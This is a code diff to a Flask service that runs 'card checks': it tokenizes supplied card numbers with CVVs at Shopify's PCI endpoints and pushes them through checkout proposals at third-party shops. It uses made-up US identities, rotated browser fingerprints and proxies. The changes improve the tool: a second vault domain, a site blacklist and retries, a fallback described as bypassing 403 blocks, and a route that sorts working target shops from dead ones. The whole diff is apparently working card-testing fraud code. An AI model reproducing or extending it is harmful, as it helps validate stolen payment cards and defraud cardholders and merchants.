@@ -1,9 +1,6 @@
 """
 app.py — Shopify Checkout Node (Render / scale plan)
-=====================================================
-Supports BOTH GraphQL schemas (lines & merchandiseLines).
 """
-
 import os
 import re
 import html
@@ -24,7 +21,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 app = Flask(__name__)
 
 # ─────────────────────────────────────────────────────────────────────────────
-# ⚙️ ENV
+# ⚙️ CONFIG & ENV
 # ─────────────────────────────────────────────────────────────────────────────
 WORKERS_CAP = int(os.environ.get("WORKERS_CAP", "20"))
 BUDGET_SEC  = float(os.environ.get("BUDGET_SEC", "40"))
@@ -56,7 +53,7 @@ def _get_sites():
     return _SITES_CACHE
 
 # ─────────────────────────────────────────────────────────────────────────────
-# ⚡ WORKER COUNTER + DEBUG
+# ⚡ STATE, COUNTER & DEBUG
 # ─────────────────────────────────────────────────────────────────────────────
 _workers_busy = 0
 _workers_lock = threading.Lock()
@@ -71,6 +68,11 @@ def _dec_busy():
 
 _last_failure = {}
 
+# Cache for products and blacklist for dead sites
+_PRODUCT_CACHE = {}   # { shop_url: (variant_id, price) }
+_BLACKLIST = {}       # { shop_url: expire_timestamp }
+_CACHE_LOCK = threading.Lock()
+
 def _fail(reason, **extra):
     global _last_failure
     _last_failure = {"reason": reason, "ts": int(time.time()), **extra}
@@ -78,7 +80,7 @@ def _fail(reason, **extra):
     return _resp(f"PROPOSAL_FAILED_{reason}")
 
 # ─────────────────────────────────────────────────────────────────────────────
-# ⚡ TLS
+# ⚡ IDENTITIES & PROXY
 # ─────────────────────────────────────────────────────────────────────────────
 BROWSER_PROFILES = ["chrome124","chrome120","chrome116","chrome110","edge101","safari15_5"]
 USER_AGENTS = [
@@ -86,10 +88,6 @@ USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
 ]
-
-# ─────────────────────────────────────────────────────────────────────────────
-# 🎭 US IDENTITIES
-# ─────────────────────────────────────────────────────────────────────────────
 FIRST_NAMES   = ["james","john","robert","michael","william","david","richard","joseph","thomas","charles"]
 LAST_NAMES    = ["smith","johnson","williams","brown","jones","garcia","miller","davis","rodriguez","martinez"]
 EMAIL_DOMAINS = ["gmail.com","yahoo.com","outlook.com","hotmail.com"]
@@ -115,9 +113,6 @@ def _street_addr(fn, ln, a):
 def _rand_suffix(n=10):
     return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))
 
-# ─────────────────────────────────────────────────────────────────────────────
-# 🔌 PROXY
-# ─────────────────────────────────────────────────────────────────────────────
 def _parse_proxy(s):
     if not s: return ""
     p = s.strip()
@@ -136,12 +131,8 @@ def _parse_proxy(s):
 # 🔍 EXTRACTIONS
 # ─────────────────────────────────────────────────────────────────────────────
 def _session_token(h):
-    for pat in (
-        r'<meta\s+name="serialized-sessionToken"\s+content="([^"]*)"',
-        r'"sessionToken"\s*:\s*"([^"]+)"',
-        r'"checkoutSessionToken"\s*:\s*"([^"]+)"',
-        r'checkout_session_token["\']?\s*:\s*["\']([^"\']+)[\"\']'
-    ):
+    for pat in (r'<meta\s+name="serialized-sessionToken"\s+content="([^"]*)"',
+                r'"sessionToken"\s*:\s*"([^"]+)"', r'"checkoutSessionToken"\s*:\s*"([^"]+)"'):
         m = re.search(pat, h)
         if m:
             t = html.unescape(m.group(1)).strip('"\'')
@@ -277,7 +268,7 @@ def _payment_method_id_from_html(h):
     return ""
 
 # ─────────────────────────────────────────────────────────────────────────────
-# 🔑 GRAPHQL IDS & PRODUCTS
+# 🔑 GRAPHQL IDS & PRODUCTS (with Cache & HTML Fallback)
 # ─────────────────────────────────────────────────────────────────────────────
 def _graphql_ids(session, shop_url, checkout_html, ua):
     m = re.search(r'(/cdn/shopifycloud/checkout-web/assets/c1/actions[A-Za-z0-9_-]*\.[A-Za-z0-9_-]+\.js)', checkout_html)
@@ -292,10 +283,17 @@ def _graphql_ids(session, shop_url, checkout_html, ua):
         return None, None, None
 
 def _cheapest_product(session, shop_url, ua, timeout=8):
+    global _PRODUCT_CACHE, _BLACKLIST
+    now = time.time()
+    
+    with _CACHE_LOCK:
+        if shop_url in _PRODUCT_CACHE:
+            return _PRODUCT_CACHE[shop_url][0], _PRODUCT_CACHE[shop_url][1], [("cache", 200)]
+
     diag = []
+    
     for ep in (f"{shop_url}/products.json?limit=250",
-               f"{shop_url}/collections/all/products.json?limit=250",
-               f"{shop_url}/collections/frontpage/products.json?limit=250"):
+               f"{shop_url}/collections/all/products.json?limit=250"):
         try:
             r = session.get(ep, headers={"user-agent": ua}, timeout=timeout)
             diag.append((ep.split(shop_url)[-1], r.status_code))
@@ -309,13 +307,42 @@ def _cheapest_product(session, shop_url, ua, timeout=8):
                     except Exception: continue
                     if price > 0 and price < best_price:
                         best_price, best_vid, best_pstr = price, str(v.get("id")), str(v.get("price","")) or str(best_price)
-            if best_vid: return best_vid, best_pstr, diag
+            if best_vid:
+                with _CACHE_LOCK:
+                    _PRODUCT_CACHE[shop_url] = (best_vid, best_pstr)
+                return best_vid, best_pstr, diag
         except Exception as e:
             diag.append((ep.split(shop_url)[-1], f"exc:{str(e)[:40]}"))
+
+    # HTML Fallback (Bypasses 403)
+    try:
+        r = session.get(f"{shop_url}/collections/all", headers={"user-agent": ua}, timeout=timeout)
+        diag.append(("/collections/all (HTML)", r.status_code))
+        if r.status_code == 200:
+            m = re.search(r'"variants":\[(.*?)\]', r.text)
+            if m:
+                vid_match = re.search(r'"id":(\d+)', m.group(1))
+                if vid_match:
+                    vid = vid_match.group(1)
+                    with _CACHE_LOCK:
+                        _PRODUCT_CACHE[shop_url] = (vid, "0.00")
+                    return vid, "0.00", diag
+            
+            m = re.search(r'variantId[":\s]+["\']?(\d{10,})', r.text)
+            if m:
+                vid = m.group(1)
+                with _CACHE_LOCK:
+                    _PRODUCT_CACHE[shop_url] = (vid, "0.00")
+                return vid, "0.00", diag
+    except Exception as e:
+        diag.append(("/collections/all (HTML)", f"exc:{str(e)[:40]}"))
+
+    with _CACHE_LOCK:
+        _BLACKLIST[shop_url] = now + 300 
     return None, None, diag
 
 # ─────────────────────────────────────────────────────────────────────────────
-# 🛒 PAYLOAD BUILDER (Supports BOTH `lines` and `merchandiseLines`)
+# 🛒 PAYLOAD BUILDER (Dynamic Schema)
 # ─────────────────────────────────────────────────────────────────────────────
 def _proposal_payload(session_token, stable_id, vid, amount, currency, email, addr, proposal_id, use_lines=False):
     if addr:
@@ -410,20 +437,41 @@ def _proposal_payload(session_token, stable_id, vid, amount, currency, email, ad
     }
 
 # ─────────────────────────────────────────────────────────────────────────────
-# 🔑 PCI
+# 🔑 PCI (Dual-Domain)
 # ─────────────────────────────────────────────────────────────────────────────
 def _tokenize(session, ccn, mm, yyyy, cvv, name, shop_domain, ua):
-    try:
-        r = session.post(
-            "https://checkout.pci.shopifyinc.com/sessions",
-            json={"credit_card": {"number":ccn,"month":int(mm),"year":int(yyyy),
-                                  "verification_value":cvv,"name":name},
-                  "payment_session_scope": shop_domain},
-            headers={"origin":"https://checkout.pci.shopifyinc.com","user-agent":ua},
-            timeout=8,
-        )
-        if r.status_code == 200: return r.json().get("id")
-    except Exception: pass
+    global _last_failure
+    # Try both Shopify Vault domains
+    endpoints = [
+        "https://checkout.pci.shopifyinc.com/sessions",
+        "https://checkout.pci.shopifycs.com/sessions"
+    ]
+    
+    last_err = ""
+    for ep in endpoints:
+        try:
+            r = session.post(
+                ep,
+                json={"credit_card": {"number":ccn,"month":int(mm),"year":int(yyyy),
+                                      "verification_value":cvv,"name":name},
+                      "payment_session_scope": shop_domain},
+                headers={"origin": ep.rsplit('/', 1)[0], "user-agent":ua},
+                timeout=8,
+            )
+            if r.status_code == 200:
+                sid = r.json().get("id")
+                if sid:
+                    return sid
+                else:
+                    last_err = f"200 OK but no ID: {r.text[:200]}"
+            else:
+                last_err = f"HTTP {r.status_code}: {r.text[:200]}"
+        except Exception as e:
+            last_err = str(e)[:100]
+            
+    # Save exact error to /debug
+    _last_failure = {"reason": "PCI_FAILED", "error_detail": last_err, "ts": int(time.time())}
+    print(f"[FAIL] PCI_FAILED | {last_err}", flush=True)
     return None
 
 # ─────────────────────────────────────────────────────────────────────────────
@@ -463,7 +511,17 @@ def _run_check(card_str, proxy_str):
     if not sites:
         return _fail("NO_SITES", hint="set SITES env var or upload site.txt")
 
-    shop_url  = random.choice(sites)
+    now = time.time()
+    with _CACHE_LOCK:
+        valid_sites = [s for s in sites if _BLACKLIST.get(s, 0) < now]
+    
+    if not valid_sites:
+        with _CACHE_LOCK:
+            _BLACKLIST.clear() 
+        valid_sites = sites
+
+    random.shuffle(valid_sites)
+
     proxy_url = _parse_proxy(proxy_str)
     ua        = random.choice(USER_AGENTS)
     imp       = random.choice(BROWSER_PROFILES)
@@ -471,11 +529,19 @@ def _run_check(card_str, proxy_str):
     session = requests.Session(impersonate=imp)
     if proxy_url: session.proxies = {"http": proxy_url, "https": proxy_url}
 
+    vid = price = None
+    shop_url = valid_sites[0]
+
     try:
-        try:
-            vid, price, diag = _cheapest_product(session, shop_url, ua, timeout=min(8, max(3, remain())))
-        except Exception as e:
-            return _fail("CHEAPEST_EXC", shop=shop_url, err=str(e)[:100])
+        for attempt_site in valid_sites[:3]:
+            shop_url = attempt_site
+            try:
+                vid, price, diag = _cheapest_product(session, shop_url, ua, timeout=min(8, max(3, remain())))
+            except Exception as e:
+                vid = None
+            if vid:
+                break 
+        
         if not vid:
             return _fail("NO_PRODUCTS", shop=shop_url, endpoints=diag)
         if remain() < 20:
@@ -531,14 +597,12 @@ def _run_check(card_str, proxy_str):
         }
         prop_url = f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal"
         
-        use_lines = False # Start with merchandiseLines (older schema)
+        use_lines = False
 
-        # ── 4a. Proposal 1 ────────────────────────────────────────────────
         try:
             p = _proposal_payload(session_token, stable_id, vid, amount, currency, None, None, prop_id, use_lines)
             r1 = session.post(prop_url, headers=hdr, json=p, timeout=min(8, max(3, remain())))
             
-            # ═══ FIX: Schema Swap Retry ═══
             if r1.status_code == 200 and "INVALID_VARIABLE" in r1.text:
                 if "merchandiseLines" in r1.text and "not defined" in r1.text:
                     use_lines = True
@@ -555,7 +619,6 @@ def _run_check(card_str, proxy_str):
         if remain() < 12:
             return _fail("BUDGET_AFTER_P1", shop=shop_url)
 
-        # ── 4b. Proposal 2 ────────────────────────────────────────────────
         try:
             p = _proposal_payload(session_token, stable_id, vid, amount, currency, email, None, prop_id, use_lines)
             p["variables"]["queueToken"] = queue_token
@@ -565,7 +628,6 @@ def _run_check(card_str, proxy_str):
         if r2.status_code != 200:
             return _fail("P2_HTTP", shop=shop_url, status=r2.status_code, body=r2.text[:800])
 
-        # ── 4c. Proposal 3 ────────────────────────────────────────────────
         try:
             p = _proposal_payload(session_token, stable_id, vid, amount, currency, email, addr, prop_id, use_lines)
             p["variables"]["queueToken"] = queue_token
@@ -575,7 +637,6 @@ def _run_check(card_str, proxy_str):
         if r3.status_code != 200:
             return _fail("P3_HTTP", shop=shop_url, status=r3.status_code, body=r3.text[:800])
 
-        # ── 4d. Extra proposals ───────────────────────────────────────────
         bodies = [r3.text]
         pm_id  = _payment_method_id(r3.text)
         del_h  = _delivery_handle(r3.text)
@@ -855,20 +916,42 @@ def route_sites():
 def route_test():
     sites = _get_sites()
     if not sites:
-        return jsonify({"error": "no sites configured", "env_set": bool(os.environ.get("SITES"))})
+        return jsonify({"error": "no sites configured"})
     shop_url = sites[0]
     try:
         sess = requests.Session(impersonate="chrome124")
         t0 = time.time()
         r  = sess.get(f"{shop_url}/products.json?limit=5", timeout=10)
-        return jsonify({
-            "shop": shop_url,
-            "status": r.status_code,
-            "elapsed_ms": int((time.time() - t0) * 1000),
-            "products_count": len(r.json().get("products", [])) if r.status_code == 200 else 0,
-        })
+        return jsonify({"shop": shop_url, "status": r.status_code, "time": int((time.time() - t0) * 1000)})
     except Exception as e:
         return jsonify({"shop": shop_url, "error": str(e)[:200]})
+
+@app.route("/validate_sites")
+def route_validate():
+    sites = _get_sites()
+    if not sites: return jsonify({"error": "no sites"})
+    
+    good_sites = []
+    bad_sites = []
+    sess = requests.Session(impersonate="chrome124")
+    
+    for site in sites:
+        try:
+            vid, price, _ = _cheapest_product(sess, site, "Mozilla/5.0", timeout=5)
+            if vid:
+                good_sites.append(site)
+            else:
+                bad_sites.append(site)
+        except Exception:
+            bad_sites.append(site)
+            
+    return jsonify({
+        "total": len(sites),
+        "working_count": len(good_sites),
+        "dead_count": len(bad_sites),
+        "working_sites": good_sites,
+        "dead_sites": bad_sites
+    })
 
 # ─────────────────────────────────────────────────────────────────────────────
 # ▶️ ENTRY
